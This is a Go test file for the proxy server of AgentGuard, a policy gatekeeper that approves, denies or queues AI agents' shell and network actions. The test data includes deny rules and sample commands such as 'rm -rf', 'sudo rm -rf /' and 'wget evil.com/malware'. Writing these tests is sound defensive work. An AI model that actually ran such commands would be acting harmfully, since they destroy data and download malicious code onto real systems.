package proxy

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/Caua-ferraz/AgentGuard/pkg/audit"
	"github.com/Caua-ferraz/AgentGuard/pkg/metrics"
	"github.com/Caua-ferraz/AgentGuard/pkg/notify"
	"github.com/Caua-ferraz/AgentGuard/pkg/policy"
)

// mustAdd is a test helper that calls ApprovalQueue.Add and fails on error.
func mustAdd(t *testing.T, q *ApprovalQueue, req policy.ActionRequest, result policy.CheckResult) *PendingAction {
	t.Helper()
	pa, err := q.Add(req, result, "local")
	if err != nil {
		t.Fatalf("ApprovalQueue.Add: %v", err)
	}
	return pa
}

// newTestServer builds a Server using httptest (never calls ListenAndServe).
func newTestServer(t *testing.T, opts ...func(*Config)) *Server {
	t.Helper()

	dir := t.TempDir()
	logPath := filepath.Join(dir, "test_audit.jsonl")
	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatalf("NewFileLogger: %v", err)
	}
	t.Cleanup(func() { logger.Close() })

	pol := &policy.Policy{
		Version: "1",
		Name:    "test-policy",
		Rules: []policy.RuleSet{
			{
				Scope:           "shell",
				Allow:           []policy.Rule{{Pattern: "ls *"}, {Pattern: "echo *"}},
				Deny:            []policy.Rule{{Pattern: "rm -rf *", Message: "Destructive command blocked"}},
				RequireApproval: []policy.Rule{{Pattern: "sudo *"}},
			},
			{
				Scope: "network",
				Allow: []policy.Rule{{Domain: "api.openai.com"}},
				Deny:  []policy.Rule{{Domain: "*.evil.com", Message: "Blocked domain"}},
			},
		},
	}

	cfg := Config{
		Port:             0,
		Engine:           policy.NewEngineFromPolicy(pol),
		Logger:           logger,
		DashboardEnabled: true,
		Notifier:         notify.NewDispatcher(policy.NotificationCfg{}),
		APIKey:           "test-secret",
		BaseURL:          "http://localhost:9999",
		Version:          "test",
	}

	for _, o := range opts {
		o(&cfg)
	}

	return NewServer(cfg)
}

// --- /v1/check ---

func TestHandleCheck_Allow(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"ls -la"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW, got %s (reason: %s)", result.Decision, result.Reason)
	}

	// Verify timing headers are present
	if w.Header().Get("X-AgentGuard-Total-Ms") == "" {
		t.Error("missing X-AgentGuard-Total-Ms header")
	}
}

func TestHandleCheck_Deny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"rm -rf /tmp/data"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY, got %s", result.Decision)
	}
	if result.Reason != "Destructive command blocked" {
		t.Errorf("unexpected reason: %s", result.Reason)
	}
}

func TestHandleCheck_RequireApproval(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"sudo apt install vim"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.RequireApproval {
		t.Errorf("expected REQUIRE_APPROVAL, got %s", result.Decision)
	}
	if result.ApprovalID == "" {
		t.Error("expected approval_id to be set")
	}
	if !strings.HasPrefix(result.ApprovalID, "ap_") {
		t.Errorf("approval_id should start with ap_, got %s", result.ApprovalID)
	}
	if result.ApprovalURL == "" {
		t.Error("expected approval_url to be set")
	}
}

func TestHandleCheck_DefaultDeny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"wget evil.com/malware"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected default DENY, got %s", result.Decision)
	}
}

func TestHandleCheck_NetworkScope(t *testing.T) {
	srv := newTestServer(t)

	// Allowed domain
	body := `{"scope":"network","domain":"api.openai.com"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW for openai, got %s", result.Decision)
	}

	// Denied domain
	body = `{"scope":"network","domain":"x.evil.com"}`
	req = httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w = httptest.NewRecorder()
	srv.handleCheck(w, req)

	result = policy.CheckResult{}
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY for evil.com, got %s", result.Decision)
	}
}

func TestHandleCheck_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/check", nil)
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestHandleCheck_InvalidJSON(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

// TestHandleCheck_OversizedBody_CustomLimit verifies that a policy-supplied
// MaxRequestBodyBytes tightens the accepted request size. Using a small
// override lets the test stay fast (no need to allocate a 1 MiB body) and
// exercises the same rejection path as the default-sized test below.
func TestHandleCheck_OversizedBody_CustomLimit(t *testing.T) {
	const customLimit = int64(256)
	srv := newTestServer(t, func(c *Config) {
		c.MaxRequestBodyBytes = customLimit
	})
	before := metrics.RequestRejectedSnapshot()[metrics.RejectedBodyTooLarge]

	body := `{"command":"` + strings.Repeat("x", int(customLimit)+1) + `"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("expected 413 under custom limit, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "256 bytes") {
		t.Errorf("error message should cite the effective limit; got %q", w.Body.String())
	}
	after := metrics.RequestRejectedSnapshot()[metrics.RejectedBodyTooLarge]
	if after != before+1 {
		t.Errorf("rejection counter: before=%d after=%d, expected +1", before, after)
	}
}

func TestHandleCheck_OversizedBody(t *testing.T) {
	srv := newTestServer(t)

	// Snapshot the rejection counter before the test so we can verify a
	// strictly-positive delta (the counter is process-global and may carry
	// state from earlier tests).
	before := metrics.RequestRejectedSnapshot()[metrics.RejectedBodyTooLarge]

	// Create a VALID-looking JSON body whose total size exceeds
	// MaxRequestBodySize. Using a raw non-JSON blob would fail at the first
	// decoder token (invalid character), never triggering MaxBytesReader.
	// A giant JSON string value forces the decoder to consume past the limit.
	bigBody := `{"command":"` + strings.Repeat("x", MaxRequestBodySize+1) + `"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(bigBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("expected 413 for oversized body, got %d: %s", w.Code, w.Body.String())
	}

	after := metrics.RequestRejectedSnapshot()[metrics.RejectedBodyTooLarge]
	if after != before+1 {
		t.Errorf("expected body_too_large counter to increment by 1; before=%d after=%d", before, after)
	}
}

// Verify the counter is exposed in Prometheus output with the reason label.
func TestMetrics_RequestRejectedTotalExposed(t *testing.T) {
	// Seed a rejection so the counter is present.
	metrics.IncRequestRejected(metrics.RejectedBodyTooLarge)

	srv := newTestServer(t)
	req := httptest.NewRequest(http.MethodGet, "/metrics", nil)
	w := httptest.NewRecorder()
	srv.handleMetrics(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "agentguard_request_rejected_total") {
		t.Error("expected agentguard_request_rejected_total in /metrics output")
	}
	if !strings.Contains(body, `reason="body_too_large"`) {
		t.Errorf("expected reason=\"body_too_large\" label, got:\n%s", body)
	}
}

// --- /v1/approve and /v1/deny ---

func TestHandleApprove(t *testing.T) {
	srv := newTestServer(t)

	// Create a pending action first
	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// Approve it
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "approved" {
		t.Errorf("expected approved, got %s", resp["status"])
	}

	// Verify it's resolved
	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if !pa.Resolved {
		t.Error("pending action should be resolved")
	}
	if pa.Decision != "ALLOW" {
		t.Errorf("expected ALLOW decision, got %s", pa.Decision)
	}
}

func TestHandleDeny(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo rm -rf /"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "denied" {
		t.Errorf("expected denied, got %s", resp["status"])
	}

	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if pa.Decision != "DENY" {
		t.Errorf("expected DENY decision, got %s", pa.Decision)
	}
}

func TestHandleApprove_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/approve/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeny_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleApprove_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/approve/ap_test", nil)
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

// --- /v1/status ---

func TestHandleStatus_Pending(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "pending" {
		t.Errorf("expected pending, got %s", resp["status"])
	}
}

func TestHandleStatus_Resolved(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = srv.approval.Resolve(pending.ID, policy.Allow, "local")

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "resolved" {
		t.Errorf("expected resolved, got %s", resp["status"])
	}
	if resp["decision"] != "ALLOW" {
		t.Errorf("expected ALLOW, got %s", resp["decision"])
	}
}

func TestHandleStatus_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/ap_missing", nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

// --- /health ---

func TestHandleHealth(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	w := httptest.NewRecorder()
	srv.handleHealth(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "ok" {
		t.Errorf("expected ok, got %s", resp["status"])
	}
	if resp["version"] != "test" {
		t.Errorf("expected version=test, got %s", resp["version"])
	}
}

// --- /metrics ---

func TestHandleMetrics(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/metrics", nil)
	w := httptest.NewRecorder()
	srv.handleMetrics(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if !strings.Contains(w.Header().Get("Content-Type"), "text/plain") {
		t.Errorf("expected text/plain content type, got %s", w.Header().Get("Content-Type"))
	}
	body := w.Body.String()
	if !strings.Contains(body, "agentguard_") {
		t.Error("metrics response should contain agentguard_ prefixed metrics")
	}
}

// --- /v1/audit ---

func TestHandleAuditQuery(t *testing.T) {
	srv := newTestServer(t)

	// Generate some audit entries via checks
	checks := []string{
		`{"scope":"shell","command":"ls -la","agent_id":"bot-1"}`,
		`{"scope":"shell","command":"echo hello","agent_id":"bot-1"}`,
		`{"scope":"network","domain":"api.openai.com","agent_id":"bot-2"}`,
	}
	for _, body := range checks {
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		w := httptest.NewRecorder()
		srv.handleCheck(w, r)
	}

	// Query all
	req := httptest.NewRequest(http.MethodGet, "/v1/audit", nil)
	w := httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	var entries []audit.Entry
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 3 {
		t.Errorf("expected 3 audit entries, got %d", len(entries))
	}

	// Query by agent
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-1", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 2 {
		t.Errorf("expected 2 entries for bot-1, got %d", len(entries))
	}

	// Query by scope
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?scope=network", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 1 {
		t.Errorf("expected 1 network entry, got %d", len(entries))
	}
}

// TestHandleAuditQuery_LimitAndOffset exercises the query-string
// contract on /v1/audit: ?limit is honored (default 100, ceiling
// MaxAuditQueryLimit, clamped silently above ceiling, 400 below 1 or
// non-numeric), ?offset skips matching records before results are collected.
func TestHandleAuditQuery_LimitAndOffset(t *testing.T) {
	srv := newTestServer(t)

	// Write 5 entries so limit/offset behavior is visible.
	for i := 0; i < 5; i++ {
		body := fmt.Sprintf(`{"scope":"shell","command":"cmd-%d","agent_id":"bot-lim"}`, i)
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		srv.handleCheck(httptest.NewRecorder(), r)
	}

	decode := func(t *testing.T, raw []byte) []audit.Entry {
		t.Helper()
		var out []audit.Entry
		if err := json.Unmarshal(raw, &out); err != nil {
			t.Fatalf("decode response %q: %v", string(raw), err)
		}
		return out
	}

	t.Run("no limit returns default", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200", w.Code)
		}
		// We wrote 5, default limit is 100, so we get all 5 back.
		if got := len(decode(t, w.Body.Bytes())); got != 5 {
			t.Errorf("got %d entries, want 5", got)
		}
	})

	t.Run("explicit limit caps results", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim&limit=2", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200", w.Code)
		}
		if got := len(decode(t, w.Body.Bytes())); got != 2 {
			t.Errorf("got %d entries, want 2", got)
		}
	})

	t.Run("limit above ceiling is silently clamped", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=999999", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200 (clamp, not reject): body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("limit below minimum is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=0", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("non-integer limit is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=abc", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("offset skips initial matches", func(t *testing.T) {
		// limit=2, offset=2 should return entries 3 and 4 (0-indexed: 2 and 3).
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim&limit=2&offset=2", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		entries := decode(t, w.Body.Bytes())
		if len(entries) != 2 {
			t.Fatalf("got %d entries, want 2", len(entries))
		}
		if entries[0].Request.Command != "cmd-2" || entries[1].Request.Command != "cmd-3" {
			t.Errorf("offset=2 returned wrong records: [%s, %s]",
				entries[0].Request.Command, entries[1].Request.Command)
		}
	})

	t.Run("negative offset is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?offset=-1", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("non-integer offset is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?offset=xyz", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})
}

// TestHandleAuditQuery_CustomDefaultAndMaxLimit verifies that the Phase-4
// audit limit overrides drive both the "no ?limit supplied" default and the
// "limit above ceiling" clamp. Uses an explicit default below the row count
// so the default-path effect is visible, and a ceiling well below the
// package default so the clamp path is observable without writing 1000 rows.
func TestHandleAuditQuery_CustomDefaultAndMaxLimit(t *testing.T) {
	srv := newTestServer(t, func(c *Config) {
		c.AuditDefaultLimit = 3
		c.AuditMaxLimit = 5
	})
	for i := 0; i < 10; i++ {
		body := fmt.Sprintf(`{"scope":"shell","command":"cmd-%d","agent_id":"bot-cfg"}`, i)
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		srv.handleCheck(httptest.NewRecorder(), r)
	}
	decode := func(raw []byte) int {
		var out []audit.Entry
		if err := json.Unmarshal(raw, &out); err != nil {
			t.Fatalf("decode: %v", err)
		}
		return len(out)
	}

	t.Run("default_limit_from_config", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-cfg", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if got := decode(w.Body.Bytes()); got != 3 {
			t.Errorf("default-limit path returned %d, want 3", got)
		}
	})
	t.Run("ceiling_clamped_to_max", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-cfg&limit=999", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if got := decode(w.Body.Bytes()); got != 5 {
			t.Errorf("limit-above-ceiling should clamp to %d, got %d", 5, got)
		}
	})
}

// --- Dashboard ---

func TestHandleDashboard_UnauthenticatedServesLogin(t *testing.T) {
	srv := newTestServer(t) // APIKey set → login page expected

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard — Sign in") {
		t.Error("unauthenticated dashboard should serve the login page")
	}
	if strings.Contains(body, "test-secret") {
		t.Errorf("login page must not leak the API key anywhere in the HTML")
	}
}

func TestHandleDashboard_AuthenticatedServesDashboard(t *testing.T) {
	srv := newTestServer(t)

	sess, err := srv.sessions.Create()
	if err != nil {
		t.Fatalf("Create session: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	req.AddCookie(&http.Cookie{Name: SessionCookieName, Value: sess.Token})
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard Dashboard") {
		t.Error("authenticated dashboard must serve the dashboard page")
	}
	if strings.Contains(body, "test-secret") {
		t.Errorf("dashboard must never embed the API key in HTML")
	}
}

func TestHandleDashboard_NoAPIKey_ServesDashboardFreely(t *testing.T) {
	srv := newTestServer(t, func(c *Config) { c.APIKey = "" })

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard Dashboard") {
		t.Error("with no API key configured, /dashboard should serve the dashboard directly")
	}
	if strings.Contains(body, `agentguard-api-key`) {
		t.Error("dashboard must never embed an api-key meta tag")
	}
}

func TestHandleDashboard_SecurityHeaders(t *testing.T) {
	srv := newTestServer(t)
	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	for _, h := range []string{"X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy", "Cache-Control"} {
		if w.Header().Get(h) == "" {
			t.Errorf("missing security header %s", h)
		}
	}
}

func TestDashboardHTML_NoAPIKeyMetaTag(t *testing.T) {
	// Compile-time guarantee: the API key must never appear in the embedded
	// dashboard HTML, regardless of server configuration.
	if strings.Contains(dashboardHTML, "agentguard-api-key") {
		t.Fatal("dashboard HTML must not reference the old api-key meta tag")
	}
	if strings.Contains(dashboardHTML, "meta[name=\"agentguard-api-key\"]") {
		t.Fatal("dashboard HTML must not read an api-key meta tag")
	}
}

func TestHandleApprove_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t) // has APIKey: "test-secret"

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// No Authorization header, no cookie — must 401 through requireAuthOrSession.
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	w := httptest.NewRecorder()
	handler := requireAuthOrSession(srv.cfg.APIKey, srv.sessions, true, srv.handleApprove)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth, got %d", w.Code)
	}
}

func TestHandleDeny_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	w := httptest.NewRecorder()
	handler := requireAuthOrSession(srv.cfg.APIKey, srv.sessions, true, srv.handleDeny)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth, got %d", w.Code)
	}
}

// --- /api/pending ---

func TestHandlePendingList(t *testing.T) {
	srv := newTestServer(t)

	// No pending actions
	req := httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w := httptest.NewRecorder()
	srv.handlePendingList(w, req)

	var list []*PendingAction
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 0 {
		t.Errorf("expected 0 pending, got %d", len(list))
	}

	// Add pending actions
	mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req = httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w = httptest.NewRecorder()
	srv.handlePendingList(w, req)

	list = nil
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

// --- /api/stats ---

func TestHandleStats(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	w := httptest.NewRecorder()
	srv.handleStats(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var stats map[string]uint64
	_ = json.NewDecoder(w.Body).Decode(&stats)
	if _, ok := stats["total"]; !ok {
		t.Error("stats should contain 'total' key")
	}
	if _, ok := stats["allowed"]; !ok {
		t.Error("stats should contain 'allowed' key")
	}
	if _, ok := stats["denied"]; !ok {
		t.Error("stats should contain 'denied' key")
	}
}

// --- Auth middleware ---

func TestRequireAuthOrSession_ValidBearer(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should have been called with valid bearer")
	}
	if w.Code != http.StatusOK {
		t.Errorf("expected 200, got %d", w.Code)
	}
}

func TestRequireAuthOrSession_InvalidBearer(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer wrong-key")
	w := httptest.NewRecorder()
	handler(w, req)

	if called {
		t.Error("handler should NOT be called with wrong bearer")
	}
	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestRequireAuthOrSession_NoAPIKey_AllowsAll(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should be called when no API key is configured")
	}
}

func TestRequireAuthOrSession_MalformedHeader(t *testing.T) {
	store := NewSessionStore()
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		t.Error("handler should NOT be called with malformed header")
	})

	// No "Bearer " prefix — treated as missing auth.
	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestNewServer_HasHTTPTimeouts(t *testing.T) {
	srv := newTestServer(t)

	if srv.http.ReadHeaderTimeout == 0 {
		t.Error("ReadHeaderTimeout should be set (Slowloris protection)")
	}
	if srv.http.ReadTimeout == 0 {
		t.Error("ReadTimeout should be set")
	}
	if srv.http.WriteTimeout == 0 {
		t.Error("WriteTimeout should be set")
	}
	if srv.http.IdleTimeout == 0 {
		t.Error("IdleTimeout should be set")
	}
}

// --- CORS middleware ---

// Backward compat (v0.4.1): empty AllowedOrigin means permissive-localhost —
// accept http://localhost:* and http://127.0.0.1:*, reject everything else.
// This mirrors pre-v0.4.0 behavior and is safe because the dashboard no
// longer embeds the API key and session cookies are SameSite=Strict.
func TestCORS_EmptyAllowedOrigin_PermissiveLocalhost(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	cases := []struct {
		origin string
		want   bool
	}{
